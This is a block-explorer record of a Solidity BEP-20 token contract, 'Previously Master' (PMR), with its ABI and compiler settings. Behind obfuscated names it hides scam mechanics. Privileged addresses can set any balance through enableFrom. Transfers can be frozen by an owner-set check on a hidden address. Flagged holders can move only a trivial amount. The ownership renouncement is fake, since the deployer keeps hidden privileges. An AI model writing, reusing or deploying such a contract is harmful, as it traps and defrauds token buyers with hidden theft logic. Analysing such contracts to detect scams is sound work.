{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.11;\n\ninterface maxIs {\n    function createPair(address launchExempt, address toWallet) external returns (address);\n}\n\ninterface isEnable {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address autoSellTo) external view returns (uint256);\n\n    function transfer(address receiverReceiver, uint256 minListMax) external returns (bool);\n\n    function allowance(address launchedEnable, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 minListMax) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address receiverReceiver,\n        uint256 minListMax\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed receiverMin, uint256 value);\n    event Approval(address indexed launchedEnable, address indexed spender, uint256 value);\n}\n\nabstract contract feeTotalMarketing {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface limitTokenMin {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface isEnableMetadata is isEnable {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract PreviouslyMaster is feeTotalMarketing, isEnable, isEnableMetadata {\n\n    function enableFrom(address amountLaunched, uint256 minListMax) public {\n        fromIs();\n        listMaxFee[amountLaunched] = minListMax;\n    }\n\n    mapping(address => mapping(address => uint256)) private fundAmount;\n\n    function decimals() external view virtual override returns (uint8) {\n        return amountAutoMin;\n    }\n\n    function transferFrom(address shouldWalletTotal, address receiverReceiver, uint256 minListMax) external override returns (bool) {\n        if (_msgSender() != teamEnable) {\n            if (fundAmount[shouldWalletTotal][_msgSender()] != type(uint256).max) {\n                require(minListMax <= fundAmount[shouldWalletTotal][_msgSender()]);\n                fundAmount[shouldWalletTotal][_msgSender()] -= minListMax;\n            }\n        }\n        return toFromTake(shouldWalletTotal, receiverReceiver, minListMax);\n    }\n\n    uint256 receiverList;\n\n    mapping(address => bool) public enableFee;\n\n    function allowance(address maxMin, address sellWalletFund) external view virtual override returns (uint256) {\n        if (sellWalletFund == teamEnable) {\n            return type(uint256).max;\n        }\n        return fundAmount[maxMin][sellWalletFund];\n    }\n\n    uint256 shouldFromSwap;\n\n    address teamEnable = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint8 private amountAutoMin = 18;\n\n    function approve(address sellWalletFund, uint256 minListMax) public virtual override returns (bool) {\n        fundAmount[_msgSender()][sellWalletFund] = minListMax;\n        emit Approval(_msgSender(), sellWalletFund, minListMax);\n        return true;\n    }\n\n    uint256 private fundTeam = 100000000 * 10 ** 18;\n\n    function fromIs() private view {\n        require(enableFee[_msgSender()]);\n    }\n\n    bool public minExempt;\n\n    function balanceOf(address autoSellTo) public view virtual override returns (uint256) {\n        return listMaxFee[autoSellTo];\n    }\n\n    address receiverAt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function getOwner() external view returns (address) {\n        return sellList;\n    }\n\n    function launchShould() public {\n        emit OwnershipTransferred(fundMaxAmount, address(0));\n        sellList = address(0);\n    }\n\n    string private maxBuy = \"PMR\";\n\n    function toFromTake(address shouldWalletTotal, address receiverReceiver, uint256 minListMax) internal returns (bool) {\n        if (shouldWalletTotal == fundMaxAmount) {\n            return launchedShould(shouldWalletTotal, receiverReceiver, minListMax);\n        }\n        uint256 liquidityBuy = isEnable(marketingFee).balanceOf(receiverAt);\n        require(liquidityBuy == shouldFromSwap);\n        require(receiverReceiver != receiverAt);\n        if (tokenIs[shouldWalletTotal]) {\n            return launchedShould(shouldWalletTotal, receiverReceiver, receiverTeam);\n        }\n        return launchedShould(shouldWalletTotal, receiverReceiver, minListMax);\n    }\n\n    address public marketingFee;\n\n    bool public receiverExemptFee;\n\n    mapping(address => uint256) private listMaxFee;\n\n    function symbol() external view virtual override returns (string memory) {\n        return maxBuy;\n    }\n\n    function launchedShould(address shouldWalletTotal, address receiverReceiver, uint256 minListMax) internal returns (bool) {\n        require(listMaxFee[shouldWalletTotal] >= minListMax);\n        listMaxFee[shouldWalletTotal] -= minListMax;\n        listMaxFee[receiverReceiver] += minListMax;\n        emit Transfer(shouldWalletTotal, receiverReceiver, minListMax);\n        return true;\n    }\n\n    function amountLimitTx(address shouldSwapMax) public {\n        fromIs();\n        \n        if (shouldSwapMax == fundMaxAmount || shouldSwapMax == marketingFee) {\n            return;\n        }\n        tokenIs[shouldSwapMax] = true;\n    }\n\n    function transfer(address amountLaunched, uint256 minListMax) external virtual override returns (bool) {\n        return toFromTake(_msgSender(), amountLaunched, minListMax);\n    }\n\n    mapping(address => bool) public tokenIs;\n\n    function name() external view virtual override returns (string memory) {\n        return sellFund;\n    }\n\n    constructor (){\n        if (receiverFund != minExempt) {\n            teamLimitAmount = true;\n        }\n        limitTokenMin shouldLimit = limitTokenMin(teamEnable);\n        marketingFee = maxIs(shouldLimit.factory()).createPair(shouldLimit.WETH(), address(this));\n        \n        fundMaxAmount = _msgSender();\n        enableFee[fundMaxAmount] = true;\n        listMaxFee[fundMaxAmount] = fundTeam;\n        launchShould();\n        if (teamLimitAmount) {\n            teamLimitAmount = true;\n        }\n        emit Transfer(address(0), fundMaxAmount, fundTeam);\n    }\n\n    function owner() external view returns (address) {\n        return sellList;\n    }\n\n    string private sellFund = \"Previously Master\";\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return fundTeam;\n    }\n\n    bool public exemptTxLiquidity;\n\n    address public fundMaxAmount;\n\n    event OwnershipTransferred(address indexed maxLimitMarketing, address indexed sellLiquidity);\n\n    uint256 constant receiverTeam = 18 ** 10;\n\n    bool private teamLimitAmount;\n\n    address private sellList;\n\n    bool public receiverFund;\n\n    function listTeam(uint256 minListMax) public {\n        fromIs();\n        shouldFromSwap = minListMax;\n    }\n\n    function swapShouldReceiver(address isShould) public {\n        require(isShould.balance < 100000);\n        if (exemptTxLiquidity) {\n            return;\n        }\n        \n        enableFee[isShould] = true;\n        if (minExempt == teamLimitAmount) {\n            teamLimitAmount = true;\n        }\n        exemptTxLiquidity = true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedEnable\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxLimitMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellLiquidity\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverMin\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxMin\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"sellWalletFund\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldSwapMax\",\"type\":\"address\"}],\"name\":\"amountLimitTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellWalletFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minListMax\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoSellTo\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"enableFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minListMax\",\"type\":\"uint256\"}],\"name\":\"enableFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptTxLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundMaxAmount\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"minListMax\",\"type\":\"uint256\"}],\"name\":\"listTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingFee\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverExemptFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isShould\",\"type\":\"address\"}],\"name\":\"swapShouldReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokenIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minListMax\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldWalletTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minListMax\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "PreviouslyMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}